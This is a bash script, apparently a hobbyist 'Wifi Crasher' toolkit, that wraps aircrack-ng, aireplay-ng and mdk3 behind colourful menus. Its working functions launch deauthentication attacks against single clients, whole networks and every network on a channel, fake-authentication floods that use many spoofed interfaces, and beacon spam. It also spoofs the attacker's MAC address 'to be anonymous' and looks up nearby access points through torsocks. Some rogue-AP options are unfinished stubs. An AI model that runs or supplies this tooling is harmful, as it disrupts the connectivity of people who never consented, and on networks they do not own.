 #!/bin/bash

 #### Colors ####
 
green="\033[32;1m"
yellow="\033[33;1m"
red="\033[31;1m"
purple="\033[37;1m"
cyan="\033[36;1m"

#### Banner ####

Banner(){
echo ${green}
clear
echo 
echo
echo  ''' 


  _    _ _  __ _    _____               _ 
 | |  | (_)/ _(_)  /  __ \             | |
 | |  | |_| |_ _   | /  \/_ __ __ _ ___| |__    ___ _ __
 | |/\| | |  _| |  | |   |  __/  _ /  __| _ \  / _ \ __|
 \  /\  / | | | |  | \__/\ | | (_| \__ \ | | |  __/ |
  \/  \/|_|_| |_|   \____/_|  \__,_|___/_| |_|\___|_|   
'''
}                                                       


 #### Variables ####

  Interface=wlo1
  wifiInterfaceMon="${Interface}mon"
  AirMonitor=airmon-ng
  AirDumper=airodump-ng
  AirAttack=aireplay-ng
  MDK=mdk3
  Tool=xterm
  sniffer=tcpdump

#### Countdown ####

CountDown(){
   i=15
until [ $i -lt 0 ]
do
    echo Starting attack in $i
sleep 1
    ((i--))
done
}


 #### Menu option


        Menuoption() {
        Banner
         echo
        
           echo     $purple"{"$cyan"1"$purple"}"$yellow"--"$green"DeauthAttacks"
             echo    $purple"{"$cyan"2"$purple"}"$yellow"--"$green"AuthDoSAttacks "
              echo    $purple"{"$cyan"3"$purple"}"$yellow"--"$green"RogueAP's Attacks"
              echo    $purple"{"$cyan"4"$purple"}"$yellow"--"$green"Beacon Flooding (Just a super SPAM SSID attack)"
               echo    $purple"{"$cyan"5"$purple"}"$yellow"--"$green"Restart Networking services" 
               echo    $purple"{"$cyan"6"$purple"}"$yellow"--"$green"Spoof MAC of monitor mode Interface (Recommended before do any attack to be anonymous)"
               echo    $purple"{"$cyan"7"$purple"}"$yellow"--"$green"Wireless Networks MAC tracking (Recommended to find vulns)"
               echo    $purple"{"$cyan"8"$purple"}"$yellow"--"$green"InterfaceConfCheck (This option show youre wireless hardware info,design and currently conf)"
                echo    $purple"{"$cyan"9"$purple"}"$yellow"--"$green"Exit "
                 echo
                            echo $purple "╭─"$green"Select Attack mode (-_-) "$purple
                           read -p " ╰─$ " get
  
                                

                                        if [ $get -eq 1 ];
                                        then
                                        echo ""
                                        DeauthAttacks
                                        

                                                elif [ $get -eq 2 ];
                                                then
                                                echo ""
                                                AuthDoSAttacks

                                                        elif [ $get -eq 3 ];
                                                        then
                                                        echo ""
                                                        RogueAPsAttacks

                                                                elif [ $get -eq 4 ];
                                                                then

                                                                        BeaconFlood

                                                                                elif [ $get -eq 5 ];
                                                                                        then
                                                                         

                                                                         RestartFunctions
                                                                         
                                                                                  
                                                                                  elif [ $get -eq 6 ];
                                                                                then

                                                                        MACspooferMonitorMode

                                                                             
                                                                                  elif [ $get -eq 7 ];
                                                                                then

                                                                                MACaddressTracking

                                                                                        elif [ $get -eq 8 ];
                                                                                        then

                                                                                        interfaceconfcheck



                                                                  elif [ $get -eq 9 ];
                                                              then
                                                          echo ${red}                                  
                                                         echo "BYEEE >:)"  
                                                            exit
                                                                  else
                                                                  echo
                                                                  echo wrong option dude :v
                                                                    sleep 2
                                                                    Menuoption
                                                                        fi
                                                                                }



DeauthAttacks(){
        
            echo    $purple"{"$cyan"1"$purple"}"$yellow"--"$green"Client Deauth (Quicks a client that you want from a network)"
             echo    $purple"{"$cyan"2"$purple"}"$yellow"--"$green"Network Deauth (Quicks out by broadcast clients from one network)"
              echo    $purple"{"$cyan"3"$purple"}"$yellow"--"$green"Broadcast Range channel Deauth"
              echo    $purple"{"$cyan"4"$purple"}"$yellow"--"$green"Street Deauth in all channels 2.4GHz by broadcast (.______.)"
              echo      $purple"{"$cyan"5"$purple"}"$yellow"--"$green"Back to menu"
                echo


                        echo $purple "╭─"$green"Select Attack mode (-_-) "$purple
                           read -p " ╰─$ " deauth
  
                                if [ $deauth -eq 1 ];
                                        then
                                        
                                        ClientDeauth

                                        elif [ $deauth -eq 2 ];
                                                then
                                                        NetworkDeauth

                                                elif [ $deauth -eq 3 ];
                                                        then
                                                                RangeDeauth

                                                        elif [ $deauth -eq 4 ];
                                                        then

                                                                StreetDeauth

                                                                elif [ $deauth -eq 5 ];
                                                                then
                                                                Menuoption
                                                                else 
                                                                echo
                                                                echo "BURRRRRRRR that option doesn't exist lmao :v"
                                                                sleep 2
                                                                echo
                                                                echo put again the option :D
                                                                echo
                                                                DeauthAttacks
                                                        
                        
fi
}

 #### Client Deauth ####


ClientDeauth(){  
   InterMsg
        echo 
         echo 
          MonitorMode
echo  "[${Green}${wifiInterfaceMon}${White}] Write the client MAC..." &
        if sudo $Tool -e nano &
           echo  "[${Green}${wifiInterfaceMon}${White}] Showing clients..."
        then sudo $Tool -e $AirDumper --bssid $bssid --channel $channel  $wifiInterfaceMon 
                echo
                read -p " Paste the target client bssid: " mac
                echo "[+] client catched"
                sleep 3
                InterMsg2
                        if sudo $Tool -fg red  -e $AirAttack -0 1000000 -a $bssid -c $mac $wifiInterfaceMon
                        then InterMsg3
                        else echo "You dont have installed xterm requeriments install with sudo apt install xterm"
                          echo "The attack has not been executed restarting tool..."
                                Menuoption
                        fi
                         fi
                            
}

 #### Network Deauth ####


NetworkDeauth(){
        
      InterMsg
            echo 
              echo
               MonitorMode
echo "\n${red}┌─[${red}Select channel for Target${red}]──[${red}~${red}]─[${red}Network${red}]:"
read -p "└─────►$(tput setaf 7) " channel
$AirDumper --bssid $bssid --channel $channel $wifiInterfaceMon > /dev/null & sleep 15 ; kill $!  
echo  "[${Green}${targetName}${White}] DoS started, all devices disconnected... "
sleep 0.5
echo  "[${Green}DoS${White}] Press ctrl+c to stop attack & exit..."
if sudo $Tool -fg red -e $AirAttack -0 100000 -a $bssid $wifiInterfaceMon 
then InterMsg3
else 
echo
echo "You dont have installed xterm requeriments install with sudo apt install xterm"
echo
echo
fi

}

 #### Range Deauth ####


RangeDeauth(){

echo "\n${red}┌─[${red}Select range channel for Targets${red}]──[${red}~${red}]─[${red}Network${red}]:"
read -p "└─────►$(tput setaf 7) " channel
            echo 
            echo "scanning networks in channel $channel..."       
            echo 
                sudo timeout 25s $Tool -e $AirDumper -c $channel --output-format kismet --write generated $wifiInterfaceMon
echo ""
                echo showing networks available in channel $channel...
echo ""

 sed -i '1d' generated-01.kismet.csv

echo  "\n\n${Red}SerialNo        WiFi Channel${White}        WiFi Network${White}"
echo "---------------------------------------------------------------------------------------"
awk -F';' '{print "     " $6 "               " $3}' generated-01.kismet.csv  | nl -n ln -w 8

echo ""
echo "sending AP MAC addresses in channel $channel to export file..."
sleep 3
awk -F';' '{print "     " $4 }' generated-01.kismet.csv >> APs.txt
sed -i '/BSSID/d' APs.txt
echo ""
echo "showing MACs..."
echo ""
cat APs.txt
echo ""
echo "Starting Deauth attack by broadcast in all networks from channel $channel"

sudo timeout 1000s $Tool -e $AirDumper -c $channel $wifiInterfaceMon &

file="APs.txt"

if [ -f "$file" ]; then
        while IFS= read -r target; do
sudo $Tool -e "$AirAttack -0 99999 -a $target $wifiInterfaceMon" &
done < "$file"

else 
   echo "the file $file doesn't exist"

fi
}

#### Street Deauth ####

StreetDeauth(){

sudo ./maker.sh
sudo ./attack.sh
}


#### Messages ####

InterMsg(){

        echo $purple "|_"$green"starting youre interface "$purple
        echo
}

InterMsg2(){
echo
echo  "[${Green}${wifiInterfaceMon}${White}+] Preparing for attack..."
echo  "[${Green}${wifiInterfaceMon}${White}+] Sending DeAuth to target..." 
echo  "[${Green}${wifiInterfaceMon}${White}+] Press ctrl+c to stop the attack..."
       
}

InterMsg3(){
echo
echo "$purple"Attack "$green"COMLETED to 100% "$purple"finishing tool tasks"$purple"
}


#### Fake Auth Attacks ####

AuthDoSAttacks(){

        echo $purple"{"$cyan"1"$purple"}"$yellow"--"$green"Fake Auth AP"
        echo $purple"{"$cyan"2"$purple"}"$yellow"--"$green"AP Auth (Auth with multiple fake MACs for a exclusive AP)"
        echo $purple"{"$cyan"3"$purple"}"$yellow"--"$green"AP Auth in range (The same than option 2 but in all AP's frpm one channel o multiple channel)"
        echo $purple"{"$cyan"4"$purple"}"$yellow"--"$green"AP Auth for all (The same than option 2 but for all AP's that finds youre wireless NIC in monitor mode)"
        echo $purple"{"$cyan"5"$purple"}"$yellow"--"$green"Craft Virtual interfaces for attack..."
        echo $purple"{"$cyan"6"$purple"}"$yellow"--"$green"Back to menu"
        echo
                        
                                           
                        echo $purple "╭─"$green"Select Attack mode (-_-) "$purple
                           read -p " ╰─$ " auth
                           echo

                                if [ $auth -eq 1 ];
                                        then
                                                FakeAuthAP
  
                                elif [ $auth -eq 2 ];
                                        then
                                                DoSAuthAP

                                        elif [ $auth -eq 3 ];
                                                then
                                                        DoSRangeAuthAP

                                                elif [ $auth -eq 4 ];
                                                        then
                                                        DoSAllAuthAP


                                                elif [ $auth -eq 5 ];
                                                        then

                                                        Menuoption
                        



fi
}

#### Fake Auth to AP ####

FakeAuthAP(){
fakeMAC=E6:EF:59:81:6A:DD
MonitorMode2
echo
echo $purple "╭─"$green"Enter MAC address target (-_-) "$purple
                           read -p " ╰─$ " AP

echo $purple "╭─"$green"Enter Network channel (-_-) "$purple
                           read -p " ╰─$ " chann

echo starting fake Auth attack...

sudo $Tool -e $AirDumper --bssid $AP -c $chann wlo1mon &
sudo $Tool -e $AirAttack -1 0 -a  $AP -h $fakeMAC $wifiInterfaceMon &
sudo $Tool -e $AirDumper --bssid $AP $wifiInterfaceMon

}

#### DOS Fake Auth to AP ####

DoSAuthAP(){
numINT=100
MonitorMode2
echo
echo $purple "╭─"$green"Enter MAC address target (-_-) "$purple
                           read -p " ╰─$ " AP

echo $purple "╭─"$green"Enter Network channel (-_-) "$purple
                           read -p " ╰─$ " chann

echo starting DoS fake AuthAP...

sudo $Tool -e $AirDumper --bssid $AP -c $chann $wifiInterfaceMon &

for i in $(seq $numINT); do

current_interface="mon$i"
current_mac="$(ip link show $current_interface | awk '/link/ {print $2}')"

echo "Current interface: $current_interface"
echo "Current mac: $current_mac"

sudo $Tool -e $AirAttack -1 0 -a "$AP" -h "$current_mac" "$current_interface" & sleep 2 > /dev/null

done

sudo $Tool -e $AirDumper --bssid $AP $wifiInterfaceMon                           
}

#### DOS Fake Auth to Range channel AP ####

DoSRangeAuthAP(){

echo $purple "╭─"$green"Select Attack mode (-_-) "$purple
                           read -p " ╰─$ " auth
echo "in develop..."
}

#### DOS Fake Auth to all 2.4GHz band ####

DoSAllAuthAP(){

echo "in develop..."
}

#### Rogue AP attacks ####

RogueAPsAttacks(){

        echo $purple"{"$cyan"1"$purple"}"$yellow"--"$green"RogueAP to 1 network"
        echo $purple"{"$cyan"2"$purple"}"$yellow"--"$green"RogueAP to range channel (all 2.4GHz networks in one channel)"
        echo $purple"{"$cyan"3"$purple"}"$yellow"--"$green"RogueAP for all (makes a reply of all near APs in all 2.4GHz band)"
        echo $purple"{"$cyan"4"$purple"}"$yellow"--"$green"Back to menu"
        echo
                        
                                           
        echo $purple "╭─"$green"Select Attack mode (-_-) "$purple
                           read -p " ╰─$ " auth
  
                                if [ $auth -eq 1 ];
                                        then
                                                Rogue1AP

                                        elif [ $auth -eq 2 ];
                                                then
                                                        RangeRogueAP

                                                elif [ $auth -eq 3 ];
                                                        then
                                                        AllRogueAP

                                                elif [ $auth -eq 4 ];
                                                        then

                                                        Menuoption

                                                        else
                                                        echo ""
                                                        echo "ah ah ah thats not correct :)"
                                                        echo ""
                                                        RogueAPsAttacks
                        
fi
}

#### Rogue1AP ####

Rogue1AP(){
        echo "in develop..."
}

#### RangeRogueAP ####

RangeRogueAP(){
        echo "in develop..."
}

#### All 2.4GHz band RogueAP attack ####

AllRogueAP(){
        echo "in develop..."
}



#### Realtime attack sniffing packets####

Realtimer(){
$Tool -fg green -e $sniffer -i $wifiInterfaceMon 
}


#### Beacon flood attack options ####

Election(){
echo
echo "You want to do a personalized attack ???" 
read -p " Press 1 for Yes  2 for No $ " get

 if [ $get -eq 1 ];
then
bash ./beaconPers.sh

        echo "starting personalized beacon flood attack"
        echo "starting stream attack"
        Realtimer &
        sleep 1 & 
        $Tool -e $MDK $wifiInterfaceMon b -f names -s 9000000000000000000



elif [ $get -eq 2 ];
then
echo ""
         echo "starting stream attack"
         echo ""
         echo "starting default attack"
        Realtimer &
        sudo $Tool -e $MDK $wifiInterfaceMon b -s 9000000000000000000
        InterMsg3

else 
echo ""
echo "Incorrect..." && sleep 2 &&
echo try again dude...
Election
echo ""
fi
}


#### Beacon flooding option menu ####

BeaconFlood(){
echo
echo "You want to see the avalaible network channels in youre area ???"
read -p " Press 1 for Yes  2 for No $ " get

 if [ $get -eq 1 ];
then
sudo $AirDumper $wifiInterfaceMon &&
clear &&
BeaconFlood

elif [ $get -eq 2 ];
then
echo
echo ""
echo "starting the 'joke mode'"
sleep 2 
echo ""

        echo "What channel of 1-13 you want to attack ??? ("For attack all channels leave in blank and enter...")"
        echo ""
     
       read -p "└─────►$(tput setaf 7) " ch
Election

else 
echo ""
echo "AAAAAA my eyes put glasses lmfao..."
echo ""
BeaconFlood
fi
}

#### Configuration status from networking services and monitor mode interface ####

RestartFunctions(){
        
           echo ""        
            echo    $purple"{"$cyan"1"$purple"}"$yellow"--"$green"Stop Monitor mode interface"
             echo    $purple"{"$cyan"2"$purple"}"$yellow"--"$green"Start all networking services"
              echo    $purple"{"$cyan"3"$purple"}"$yellow"--"$green"Show status of all networking services"
              echo    $purple"{"$cyan"4"$purple"}"$yellow"--"$green"Stop all networking services"
              echo ""
               
           
        echo $purple "Choose one number option╭─"$green" (-_-) "$purple
        read -p " ╰─$ " restart

  
                if [ $restart -eq 1 ];
                then
                echo              
                        echo "Restarting Network services..."
                        $AirMonitor stop $wifiInterfaceMon >> /dev/null
                                sleep 2
                                echo "The restart has been succesfull..."




                        elif [ $restart -eq 2 ];
                        then 
                                sudo systemctl start NetworkManager
                                        sudo systemctl start avahi-daemon.socket
                                                sudo systemctl start avahi-daemon.service


                                elif [ $restart -eq 3 ];
                                then 
                                echo ""
                                sudo systemctl status avahi-daemon.socket
                                        echo ""
                                        sudo systemctl status avahi-daemon
                                                echo ""
                                                sudo systemctl status NetworkManager
                                                        echo ""
                                                        sudo systemctl status wpa_supplicant.service

                                        elif [ $restart -eq 4 ];
                                        then 

                                        sudo systemctl stop wpa_supplicant.service 
                                                sudo systemctl stop NetworkManager
                                                sudo systemctl stop avahi-daemon.socket 
                                                        sudo systemctl stop avahi-daemon


                                                        else
                                                        echo ""
                                                        echo "Put a avalaible options please... :("
                                                        echo ""
                                                        RestartFunctions

                                        fi
                                        }




##### Monitor mode, scan available networks & select target #####


MonitorMode(){      
       if $AirMonitor start $Interface >> /dev/null
        then echo starting monitor mode with $Interface
        sleep 2
        echo Scanning Networks...
                trap "airmon-ng stop $wifiInterfaceMon > /dev/null;rm generated-01.kismet.csv handshake-01.cap 2> /dev/null" EXIT
                airodump-ng --output-format kismet --write generated $wifiInterfaceMon > /dev/null & sleep 15 ; kill $!
                echo showing networks available...
                        sed -i '1d' generated-01.kismet.csv
                        echo  "\n\n${Red}SerialNo        WiFi Channel${White}        WiFi Network${White}"
                        echo "---------------------------------------------------------------------------------------"
                        awk -F';' '{print "     " $6 "               " $3}' generated-01.kismet.csv  | nl -n ln -w 8
                                targetNumber=1000
                                while [ ${targetNumber} -gt `wc -l generated-01.kismet.csv | cut -d " " -f 1` ] || [ ${targetNumber} -lt 1 ]; do 
                                        echo "\n${red}┌─[${red}Select Target${red}]──[${red}~${red}]─[${red}Network${red}]:"
                                        read -p "└─────►$(tput setaf 7) " targetNumber
                                        done
                                        targetName=`sed -n "${targetNumber}p" < generated-01.kismet.csv | cut -d ";" -f 3 `
                                        bssid=`sed -n "${targetNumber}p" < generated-01.kismet.csv | cut -d ";" -f 4 `
                                        channel=`sed -n "${targetNumber}p" < generated-01.kismet.csv | cut -d ";" -f 6 `
                                                rm generated-01.kismet.csv 2> /dev/null

                                                else
echo checking if interface its in monitor mode...
if xterm -e sudo airodump-ng $Interface == true
then 
echo the interface its in monitor mode Scanning Networks...
                trap "airmon-ng stop $wifiInterfaceMon > /dev/null;rm generated-01.kismet.csv handshake-01.cap 2> /dev/null" EXIT
                airodump-ng --output-format kismet --write generated $wifiInterfaceMon > /dev/null & sleep 15 ; kill $!
                echo showing networks available...
                        sed -i '1d' generated-01.kismet.csv
                        echo  "\n\n${Red}SerialNo        WiFi Channel${White}        WiFi Network${White}"
                        echo "---------------------------------------------------------------------------------------"
                        awk -F';' '{print "     " $6 "               " $3}' generated-01.kismet.csv  | nl -n ln -w 8
                                targetNumber=1000
                                while [ ${targetNumber} -gt `wc -l generated-01.kismet.csv | cut -d " " -f 1` ] || [ ${targetNumber} -lt 1 ]; do 
                                        echo "\n${red}┌─[${red}Select Target${red}]──[${red}~${red}]─[${red}Network${red}]:"
                                        read -p "└─────►$(tput setaf 7) " targetNumber
                                        done
                                        targetName=`sed -n "${targetNumber}p" < generated-01.kismet.csv | cut -d ";" -f 3 `
                                        bssid=`sed -n "${targetNumber}p" < generated-01.kismet.csv | cut -d ";" -f 4 `
                                        channel=`sed -n "${targetNumber}p" < generated-01.kismet.csv | cut -d ";" -f 6 `
                                                rm generated-01.kismet.csv 2> /dev/null


  echo
  else
  echo "The tool dont start restart the software or the NIC and try again" 
   echo
    echo
    exit
fi
fi
}

 

#### Monitor Mode2 #### 

MonitorMode2(){      
       if $AirMonitor start $Interface >> /dev/null
        then echo starting monitor mode with $Interface
        sleep 2
        echo Scanning Networks...
                trap "airmon-ng stop $wifiInterfaceMon > /dev/null;rm generated-01.kismet.csv handshake-01.cap 2> /dev/null" EXIT
                airodump-ng --output-format kismet --write generated $wifiInterfaceMon > /dev/null & sleep 15 ; kill $!
                echo showing networks available...
                        sed -i '1d' generated-01.kismet.csv
                        echo  "\n\n${Red}SerialNo        WiFi Channel${White}        WiFi Network${White}                               MAC Address${White}"
                        echo "---------------------------------------------------------------------------------------------------------------"
                        awk -F';' '{print "     " $6 "               " $3 "               "$4}' generated-01.kismet.csv  | nl -n ln -w 8
                                

                                                else

echo checking if interface its in monitor mode...
if xterm -e sudo airodump-ng $Interface == true
then 
echo the interface its in monitor mode Scanning Networks...
                trap "airmon-ng stop $wifiInterfaceMon > /dev/null;rm generated-01.kismet.csv handshake-01.cap 2> /dev/null" EXIT
                airodump-ng --output-format kismet --write generated $wifiInterfaceMon > /dev/null & sleep 15 ; kill $!
                echo showing networks available...
                        sed -i '1d' generated-01.kismet.csv
                        echo  "\n\n${Red}SerialNo     WiFi Channel${White}        WiFi Network${White}                              MAC Address${White}"
                        echo "----------------------------------------------------------------------------------------------------------------------------"
                        awk -F';' '{print "   " $6 "           "$3"                              "      " " """"""""""""""""""""$4}' generated-01.kismet.csv  | nl -n ln -w 8
                                

                                                 rm generated-01.kismet.csv 2> /dev/null


  echo
  else
  echo "The tool dont start restart the software or the NIC and try again" 
   echo
    echo
    exit
fi
fi
}


#### MAC spoofer for monitor mode ####


MACspooferMonitorMode(){
echo ""
ifconfig
echo ""
echo $purple "╭─"$green"Put youre interface name in monitor mode (-_-) "$purple
read -p " ╰─$ " faker

echo $purple "╭─"$green"Put youre fake MAC address for the monitor mode interface (-_-) "$purple
read -p " ╰─$ " addressFaker

sudo ip link set dev $faker down
sudo ip link set dev $faker address $addressFaker
sudo ip link set dev $faker up
echo
echo showing results:
echo ""
iw dev $faker info
echo ""
sudo rm -rf *csv
}


#### MAC address tracking and fingerprint  ####

MACaddressTracking(){

        echo
        sudo timeout 25s $Tool -e $AirDumper --output-format kismet --write generated $wifiInterfaceMon
echo ""
echo "sending scanner dumped info to >> AP's.txt"
sleep 3
awk -F';' '{print "     " $4 }' generated-01.kismet.csv >> AP's'.txt
echo ""
cat AP's'.txt
echo ""
echo "Extracting : characters from AP's.txt and Redirecting content to output.txt"
sleep 3
awk -F':' '{print " " $1$2$3$4$5$6}' AP's'.txt > output.txt
echo ""
cat output.txt
echo ""
echo "Deleting APs file..."
sleep 3
rm -r AP's'.txt
echo "Deleting spaces and Unnecessary content from: (output.txt)"
sed -i 's/^[[:space:]]*//' output.txt
sed -i '/BSSID/d' output.txt 
echo ""
cat output.txt
echo ""
sleep 3
echo ""
echo "starting torsocks proxy..."
sleep 3
if source torsocks on == true
then 
echo ""
echo "proxy started..."
fi 
echo ""
echo "starting MAC address tracking"
count=1

 while IFS= read -r name || [ -n "$name" ]; do

url="https://aruljohn.com/mac/$name"

results="mac${count}.txt"
w3m "$url" > "$results" 2>&1
    count=$((count+1))

done < output.txt

echo "MAC address tracking finished wait..."
sleep 3
echo "Preparing Results..."
sleep 3
for file in mac*.txt; do
sed -i '1,23d;43,257d' "$file"
sed -i '18,20d' "$file"
sed -i '/Direct link to this MAC lookup result \[https:\/\/aruljohn.com\]/d' $file
sed -i '/Enter multiple MAC addresss or OUI,/d' $file
sed -i '/one per line. Maximum 100 at a time./d' $file
sed -i 's/^\s*\[\s* *\]\s*$//' $file
sed -i 's/\bEzoic\b//g' $file
echo ""
awk '/Results/ {print "------------------------------------------"}1' $file
echo ""
done
cat mac*.txt >> resultsMACS.txt
echo ""
echo "Deleting data files..."
rm -r mac*
rm -fr output.txt generated-01.kismet.csv resultsMACS.txt
echo ""
echo "starting Tracking 2"
echo "Tracking 2 in develop..."
sleep 3
             
}

#### Interface conf check ####

interfaceconfcheck(){

iwconfig
echo ""
echo ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------
echo ""
sudo lshw -class network
echo ""
echo ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------
echo ""
iw list
echo ""
}

#### Functions call ####

FuncioRecon(){
Banner    
Menuoption
}     
FuncioRecon                                                  

